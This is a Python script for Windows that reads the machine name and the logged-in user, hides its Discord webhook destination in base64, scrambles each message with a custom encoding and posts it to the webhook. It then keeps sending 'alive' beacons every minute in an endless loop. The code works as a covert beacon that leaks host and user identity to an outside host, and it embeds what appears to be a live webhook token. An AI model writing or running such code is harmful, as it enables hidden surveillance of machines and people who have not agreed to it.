import string
import base64
import json
import os
import socket
import urllib.request
from time import sleep

import win32com.client
import subprocess
import re

# Base64-encoded Discord webhook URL
WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NDY5MTMzMTgyMDU1NjM5Mi9zeS16UkEzS3NYMFp0U1FMSmowZXVvNlVxR3prbF9OSlRBcGhqZm9BR0E0ck1WN2w4eWNERTFuUG9IU2dsSTQ0am1ESQ=="

def format_start_data(computer_name,user_name):
    data = {'info':'script_started','script':'system','computer':computer_name,'username':user_name}
    return f"{json.dumps(data)}"

def format_alive_data(computer_name,user_name):
    data = {'info':'alive','script':'system','computer':computer_name,'username':user_name}
    return f"{json.dumps(data)}"

def encrypt(text: str) -> str:
    # Base64 encode
    b64 = base64.b64encode(text.encode()).decode()

    lower = string.ascii_lowercase
    upper = string.ascii_uppercase

    lower_rot = lower[5:] + lower[:5]      # +5 rotation
    upper_rot = upper[-3:] + upper[:-3]    # -3 rotation

    table = str.maketrans(
        lower + upper,
        lower_rot + upper_rot
    )

    encrypted = b64.translate(table)
    encrypted = encrypted.replace("==","-°").replace("=","_")

    return encrypted
 
def get_logged_in_user():
    """
    Returns one interactive logged-in user (DOMAIN\\User).
    Returns None if no interactive user is logged in.
    """
    try:
        wmi = win32com.client.GetObject("winmgmts:")
        sessions = wmi.ExecQuery(
            "SELECT * FROM Win32_LogonSession WHERE LogonType = 2 OR LogonType = 10"
        )
 
        for session in sessions:
            assoc = wmi.ExecQuery(
                f"ASSOCIATORS OF {{Win32_LogonSession.LogonId='{session.LogonId}'}} "
                "WHERE AssocClass=Win32_LoggedOnUser"
            )
            for user in assoc:
                return f"{user.Domain}\\{user.Name}"
 
    except Exception:
        pass
 
    return None

def send_webhook(message):
    webhook_url = base64.b64decode(WEBHOOK_B64).decode("utf-8")

    payload = json.dumps({
        "content": encrypt(message)
    }).encode("utf-8")

    req = urllib.request.Request(
        webhook_url,
        data=payload,
        method="POST",
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (DiscordWebhook)"
        }
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            response.read()
        return True
    except urllib.error.HTTPError as e:
        print("HTTP error:", e.code, e.read().decode())
        return False
    except Exception as e:
        print("Error:", e)
        return False
        
if __name__ == "__main__":
    computer_name = os.environ.get("COMPUTERNAME", socket.gethostname())
    user_name = os.environ.get("USERNAME", "SYSTEM")

    first_message = True

    s = False
    alive_data = format_alive_data(computer_name,user_name)
    while True:
        if not s:
            user = get_logged_in_user()        
            if user:
                msg = (
                    f"{computer_name} {user_name} {user}"
                )
                
                sent = send_webhook(msg)
                if sent:               
                    s = True


        
        
        if first_message:
            msg = (
                f"{format_start_data(computer_name,user_name)}"
            )
        else:        
            msg = (
                f"{alive_data}"
            )
        
        sent = send_webhook(msg)
        if sent and first_message:
            first_message = False

        sleep(60)
